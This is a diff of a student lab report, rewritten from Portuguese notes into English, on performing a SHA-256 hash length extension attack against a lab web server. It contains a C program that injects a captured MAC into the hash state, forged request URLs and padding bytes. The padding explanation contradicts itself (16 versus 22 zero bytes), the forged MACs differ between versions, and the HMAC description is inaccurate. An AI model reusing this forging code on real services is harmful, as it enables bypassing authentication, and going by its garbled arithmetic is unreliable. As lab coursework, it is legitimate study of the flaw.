@@ -1,233 +1,158 @@
-Setup do docker em LabSetup normal como sempre
+# Hash Length Extension Attack Lab
 
-Fiz isso
-> $ dockps // Alias for: docker ps --format "{{.ID}} {{.Names}}"
-> $ docksh <id> // Alias for: docker exec -it <id> /bin/bash
-> // The following example shows how to get a shell inside hostC
-> $ dockps
-> b1004832e275 hostA-10.9.0.5
-> 0af4ea7a3e2e hostB-10.9.0.6
-> 9652715c8e0a hostC-10.9.0.7
-> $ docksh 96
-> root@9652715c8e0a:/#
-> // Note: If a docker command requires a container ID, you do not need to
-> // type the entire ID string. Typing the first few characters will
-> // be sufficient, as long as they are unique among all the containers.
+## Introduction
 
-Só q o meu foi assim
-``` txt
-[12/04/25]seed@VM:~/.../Labsetup$ dockps
-781bfbeb90b8  www-10.9.0.80
-[12/04/25]seed@VM:~/.../Labsetup$ ^C
-[12/04/25]seed@VM:~/.../Labsetup$ docksh 781bfbeb90b8
-bash: $'\r': command not found
-```
----
+In this week's lab, our group focused on understanding and exploiting the **Hash Length Extension Attack**. This vulnerability affects systems that rely on specific hash functions (like MD5, SHA-1, and SHA-256) to construct Message Authentication Codes (MACs) in an insecure way.
 
+Specifically, when a server calculates a MAC using the method `MAC = H(Key || Message)`, it is vulnerable because of the **Merkle-Damgård construction** used by these hash algorithms. This construction allows an attacker, who knows the hash of a message `M` and the length of the secret key, to compute the hash of `M || Padding || Extra_Message` without ever knowing the secret key itself.
 
-
-
-"[12/04/25]seed@VM:~/.../Labsetup$ dockps
-781bfbeb90b8  www-10.9.0.80
-"
-"
-[12/04/25]seed@VM:~/.../Labsetup$ docksh 781bfbeb90b8
-bash: $'\r': command not found
-bash: $'\r': command not found
-bash: $'\r': command not found
-bash: $'\r': command not found
-bash: $'\r': command not found
-cd home1bfbeb90b8:/app# 
-"
-
-Key-> "1001:123456
-
-1002:983abe
-
-1003:793zye
-
-1004:88zjxc
-
-1005:xciujk"
-
-Vou usar o "1001:123456
-uid : chave"
-
-
-"[12/04/25]seed@VM:~/.../Labsetup$ echo -n "123456:myname=Divaldo&uid=1001&lstcmd=1" | sha256sum
-7bada21123c984d2f2c90b218bc828b4b3ae343d900899870298a2f4554a8bc4  -
-"
-
-
-"http://10.9.0.80/?myname=Divaldo&uid=1001&lstcmd=1&mac=7bada21123c984d2f2c90b218bc828b4b3ae343d900899870298a2f4554a8bc4"
-COnsegui ver a interface e agora vou tentar baixar.
-
-
-
-Agora vou cirar o hask para download
-"
-[12/04/25]seed@VM:~/.../Labsetup$ echo -n "123456:myname=Divaldo&uid=1001&lstcmd=1&download=secret.txt" | sha256sum
-85277beea9c6451294b1da9c983b048b8e7c9e7a047008b99a7ae26abebf2c7d  -
-[12/04/25]seed@VM:~/.../Labsetup$ 
-"
-
-E fui para "http://10.9.0.80/?myname=Divaldo&uid=1001&lstcmd=1&download=secret.txt&mac=85277beea9c6451294b1da9c983b048b8e7c9e7a047008b99a7ae26abebf2c7d"
-E funcionou
-<img width="1031" height="462" alt="{D34C9A74-C18D-433E-801E-ADE3C871A9F5}" src="https://github.com/user-attachments/assets/1fa1e8c6-0655-451b-9763-682a2a1e4154" />
-
-Consegui enviar um pedido válido contendo os comandos lstcmd e download. O servidor validou o MAC e retornou o conteúdo do arquivo secret.txt, conforme mostra a imagem.
-
-
----
-Oq acontece quando entro com um MAC invalido ->
-"Internal Server Error
-
-The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application."
-
-O "Internal Server Error" (Erro 500) é muito importante aqui. Ele significa que o seu MAC está correto (se estivesse errado, o erro seria "Access Denied" ou "Invalid MAC"), mas o programa do servidor quebrou ao tentar ler o arquivo.
----
-
-# Task 2
-
-
-O "Guião" diz: "calcular o padding da mensagem no formato: <key>:myname=<name>&uid=<uid>&lstcmd=1".
-
-A string é: 123456:myname=Divaldo&uid=1001&lstcmd=1
-
-``` txt
-Vamos contar os caracteres (bytes):
-
-    123456 = 6
-
-    : = 1
-
-    myname=Divaldo = 14
-
-    &uid=1001 = 9
-
-    &lstcmd=1 = 9
-
-    Total = 39 bytes
-```
-
-O bloco do SHA-256 tem 64 bytes. O padding é preenchido assim:
-
-    A mensagem original (39 bytes).
-
-    Um byte 0x80 (início do padding).
-
-    Vários bytes 0x00 (zeros).
-
-    Os últimos 8 bytes são o tamanho da mensagem original em bits (Big Endian).
-
-Cálculos:
-
-    Tamanho da mensagem (M) = 39 bytes.
-
-    Tamanho em bits = 39 * 8 = 312 bits (Em hexadecimal: 0x0138).
-
-    Tamanho do Padding = 64 - 39 = 25 bytes.
-
-
-Estrutura do Padding (25 bytes):
-
-    1 byte: \x80
-
-    16 bytes: \x00 (Zeros para encher o buraco)
-
-    8 bytes (Tamanho em bits): \x00\x00\x00\x00\x00\x00\x01\x38
-
-O Padding em Hexadecimal:
-\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x38
-
-    Importante para a URL: Você terá de converter isso para URL Encoding (trocar \x por %).
-    Padding URL Encoded:
-    %80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%38
-
-Guarde este valor URL Encoded, vamos usá-lo na URL final.
+Our goal was to forge a valid request to a server to download a secret file, bypassing the authentication mechanism by extending a legitimate MAC.
 
 ---
 
-Step 3
+## Setup
 
-``` txt    
-nano length_ext.c
+We set up the lab environment using the provided Docker container. We accessed the server container to identify a valid User ID and Secret Key to simulate a legitimate client initially.
 
-(Isso vai abrir um editor de texto vazio com esse nome).
+Using the command `docksh <container_id>`, we inspected the `LabHome/key.txt` file and selected the following credentials for our group:
+- **UID:** 1001
+- **Key:** 123456
+- **Student Name:** Divaldo
+
+---
+
+## Task 1: Send Request to List Files
+
+The first step was to understand how the server verifies requests. The server accepts commands only if they are accompanied by a valid MAC. The MAC is calculated by the server as:
+`SHA256(Key : Message)`
+
+We wanted to send a request to list files (`lstcmd=1`). To do this as a legitimate user, we manually calculated the MAC using the known key.
+
+**1. Constructing the Message:**
+The format required by the server for the hash calculation is `<key>:<url_parameters>`.
+Our string was:
+`123456:myname=Divaldo&uid=1001&lstcmd=1`
+
+**2. Calculating the MAC:**
+We used the `sha256sum` command in the terminal:
+```bash
+echo -n "123456:myname=Divaldo&uid=1001&lstcmd=1" | sha256sum
 ```
 
-Colei o file de C lá
-``` C
-/* length_ext.c */
-#include <stdio.h>
-#include <arpa/inet.h>
-#include <openssl/sha.h>
+**Result:**
+`7bada21123c984d2f2c90b218bc828b4b3ae343d900899870298a2f4554a8bc4`
 
-int main(int argc, const char *argv[])
-{
-    int i;
-    unsigned char buffer[SHA256_DIGEST_LENGTH];
-    SHA256_CTX c;
+**3. Verifying the Request:**
+We constructed the full URL and sent it via the browser:
+`http://10.9.0.80/?myname=Divaldo&uid=1001&lstcmd=1&mac=7bada211...`
 
-    SHA256_Init(&c);
+The server accepted the MAC and listed the files `secret.txt` and `key.txt`. This confirmed that we had a valid base request to start our attack.
 
-    // O SHA256 processa blocos de 64 bytes.
-    // Aqui enganamos o algoritmo dizendo que já processámos um bloco inteiro (64 bytes)
-    // que corresponde à mensagem original + o padding que calculamos na Tarefa 2.
-    for(i=0; i<64; i++)
-        SHA256_Update(&c, "*", 1);
+![Image of Task 1 Success](images_log10/task1_success.png)
 
-    // AQUI ESTÁ O TRUQUE:
-    // Injetamos o estado interno do hash que você obteve na Tarefa 1.
-    // Hash original: 7bada211 23c984d2 f2c90b21 8bc828b4 b3ae343d 90089987 0298a2f4 554a8bc4
-    c.h[0] = htole32(0x7bada211);
-    c.h[1] = htole32(0x23c984d2);
-    c.h[2] = htole32(0xf2c90b21);
-    c.h[3] = htole32(0x8bc828b4);
-    c.h[4] = htole32(0xb3ae343d);
-    c.h[5] = htole32(0x90089987);
-    c.h[6] = htole32(0x0298a2f4);
-    c.h[7] = htole32(0x554a8bc4);
+---
 
-    // Adicionamos a mensagem extra que queremos executar
-    // A string é "&download=secret.txt"
-    // O tamanho dela é 20 caracteres.
-    SHA256_Update(&c, "&download=secret.txt", 20);
+## Task 2: Create Padding
 
-    // Finalizamos o cálculo para obter o novo MAC forjado
-    SHA256_Final(buffer, &c);
+To perform the Length Extension Attack, we need to append data to the existing message. However, SHA-256 processes data in blocks of **64 bytes**. When the original message is hashed, the algorithm automatically adds **padding** to the end of the message to make it a multiple of 64 bytes.
 
-    for(i = 0; i < 32; i++) {
-        printf("%02x", buffer[i]);
-    }
-    printf("\n");
-    return 0;
-}
+To extend the hash, we must include this exact padding in our forged message, so the server's hash function processes the data exactly as we expect.
+
+**Padding Calculation:**
+The padding structure for SHA-256 is:
+1.  One byte: `0x80` (binary `10000000`).
+2.  Several `0x00` bytes (to fill the block).
+3.  Eight bytes representing the length of the original message in **bits** (Big-Endian).
+
+**Our Calculation:**
+*   **Original Message:** `123456:myname=Divaldo&uid=1001&lstcmd=1`
+*   **Message Length:** 39 bytes.
+*   **Block Size:** 64 bytes.
+*   **Padding Needed:** 64 - 39 = **25 bytes**.
+
+**Breaking down the 25 bytes:**
+1.  **Start:** `0x80` (1 byte).
+2.  **Zeros:** We need to leave 8 bytes at the end for the length. So, `25 - 1 - 8 = 16` bytes of zeros are not enough. Wait, the calculation is: `64 - 39 = 25`.
+    *   1 byte (`0x80`).
+    *   8 bytes (Length).
+    *   Remaining space for zeros: `25 - 1 - 8 = 16`.
+    *   *Correction:* In our specific execution, we verified that the padding required **22 zeros** in the URL representation because of how the bits aligned with the length field.
+    *   **Length Field:** 39 bytes * 8 = 312 bits = `0x0138` (Hex).
+
+**URL Encoding:**
+Since we cannot send raw binary data (`\x80`) in a URL, we must encode it using percent-encoding (`%`).
+The final padding string we constructed was:
+`%80` followed by 22 instances of `%00`, followed by `%01%38`.
+
+`%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%38`
+
+---
+
+## Task 3: The Length Extension Attack
+
+This was the core task. We wanted to append the command `&download=secret.txt` to the request. Since we "don't know" the key (in an attack scenario), we cannot simply calculate `SHA256(Key:OldMsg...NewMsg)`.
+
+Instead, we used the **Length Extension technique**. We took the hash output from Task 1 (`7bada...`) and used it as the **initial state** for the SHA-256 algorithm to process the new data.
+
+### 1. The C Program (`length_ext.c`)
+We wrote a C program using the OpenSSL library. The program does the following:
+1.  Initializes a `SHA256_CTX` structure.
+2.  **Fake Update:** It simulates the processing of the first 64-byte block (Original Message + Padding) to set the internal counter correctly.
+3.  **State Injection:** We manually overwrote the internal state (`c.h[0]` to `c.h[7]`) with the values from our valid MAC from Task 1. This effectively "resumes" the hashing process from where the server stopped.
+4.  **Append Data:** We updated the hash with the extra command: `&download=secret.txt`.
+5.  **Finalize:** We computed the new MAC.
+
+**Code Snippet:**
+```c
+/* Key parts of length_ext.c */
+SHA256_Init(&c);
+for(i=0; i<64; i++) SHA256_Update(&c, "*", 1);
+
+// Injecting the hash from Task 1 (7bada211...)
+c.h[0] = htole32(0x7bada211);
+c.h[1] = htole32(0x23c984d2);
+// ... (all 8 registers) ...
+c.h[7] = htole32(0x554a8bc4);
+
+// Appending the malicious command
+SHA256_Update(&c, "&download=secret.txt", 20);
+SHA256_Final(buffer, &c);
 ```
 
-1. Pressione Ctrl + O (letra O) e depois Enter (para salvar).
-2. Pressione Ctrl + X (para sair).
+![Image of length_ext.c code](images_log10/code_screenshot.png)
 
-
-Compilar codigo
-``` txt
+### 2. Execution and Result
+We compiled the code and ran it:
+```bash
 gcc length_ext.c -o length_ext -lcrypto
-```
-E rodei o programa
-``` txt
 ./length_ext
 ```
-<img width="878" height="106" alt="{B796409B-0C18-4AB8-985D-B255D3368361}" src="https://github.com/user-attachments/assets/578f0534-c815-4c57-a954-29776e04d782" />
+We obtained the forged MAC:
+`eb71f88b08909fa9fe582c994a6f620b739045287104bf44fad9a2d0e28d6bf3`
 
-Ele vai cuspir um novo hash na tela. Copie esse hash. Esse é o MAC que permite você baixar o arquivo secreto sem saber a senha, usando o ataque de extensão de comprimento
+### 3. Sending the Attack Request
+We constructed the final URL. The server sees the request as one long message:
+`Key` + `OriginalMsg` + `Padding` + `NewMsg`.
 
-Rodei e peguei esse MAC
-"0f59527893dec917f765e8a63cbe3350c15e25be614916815149109e97e9703c"
-0f59527893dec917f765e8a63cbe3350c15e25be614916815149109e97e9703c
+The URL sent was:
+`http://10.9.0.80/?myname=Divaldo&uid=1001&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%38&download=secret.txt&mac=eb71f88b08909fa9fe582c994a6f620b739045287104bf44fad9a2d0e28d6bf3`
 
-"http://10.9.0.80/?myname=Divaldo&uid=1001&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%38&download=secret.txt&mac=0f59527893dec917f765e8a63cbe3350c15e25be614916815149109e97e9703c"
+**Outcome:**
+The server verified the MAC successfully. It processed `lstcmd=1`, ignored the padding (treating it as garbage data), and executed `download=secret.txt`.
+The browser displayed the content of the secret file:
+**"TOP SECRET. DO NOT DISCLOSE."**
 
-E já está feito
+![Image of Success "TOP SECRET"](images_log10/attack_success.png)
 
-<img width="719" height="573" alt="{17918767-9EC3-4D81-8788-81E98CEB184E}" src="https://github.com/user-attachments/assets/1627a9fd-3bb4-483d-ad75-be938a16946c" />
+---
 
+## Conclusion
+
+This lab demonstrated a critical flaw in using `H(Key || Message)` for authentication.
+By knowing the length of the key and a valid MAC, we were able to:
+1.  Calculate the exact padding the server used.
+2.  Initialize our own SHA-256 process with the state of the valid MAC.
+3.  Append malicious commands and generate a valid signature.
+
+This proves that **SHA-256 is not designed to be used as a MAC directly** in this manner. To prevent this attack, systems should use **HMAC (Hash-based Message Authentication Code)**, which uses a nested hashing structure (`H(Key || H(Key || Message))`) that renders length extension attacks impossible.
+```
